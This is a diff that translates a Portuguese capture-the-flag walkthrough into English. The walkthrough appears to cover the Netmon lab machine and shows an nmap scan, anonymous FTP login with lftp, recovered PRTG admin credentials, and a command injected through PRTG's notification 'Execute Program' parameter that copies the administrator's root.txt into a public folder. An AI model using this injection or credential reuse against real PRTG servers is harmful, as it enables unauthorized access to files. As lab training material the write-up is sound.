@@ -1,6 +1,6 @@
-## Passo a Passo
+## Walkthrough
 
-#### No terminal
+#### Terminal
 
 ```
 $ nmap 10.10.10.152
@@ -19,7 +19,6 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
 ```
 
-**Porta 21 ftp aberta significa que podemos usar o lftp para acessar como Anonymous@host**
 ```
 $ lftp Anonymous@10.10.10.152
 
@@ -103,22 +102,22 @@ PrTg@dmin2018
 ...
 ```
 
-#### No site http://10.10.10.152
+#### Site http://10.10.10.152
 
 Username: prtgadmin
 Password: PrTg@dmin2019
 
-Setup -> Notifications -> Editar Notificação -> Ativar Execute Program 
+Setup -> Notifications -> Edit Notifications -> Execute Program 
 
-Para rodar o comando no terminal do powershell:
+Run command in powershell:
 1. Demo exe notification - outfile.ps1
-2. Parâmetro:
+2. Parameter:
 ```
 flag.txt; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\flag.txt" -Recurse
 ```
-3. Executar Notificação
+3. Execute Notification
 
-4. Em ```$lftp> Users/Public```
+4. In ```$lftp> Users/Public```
 ```
 $ cat flag.txt
 ```
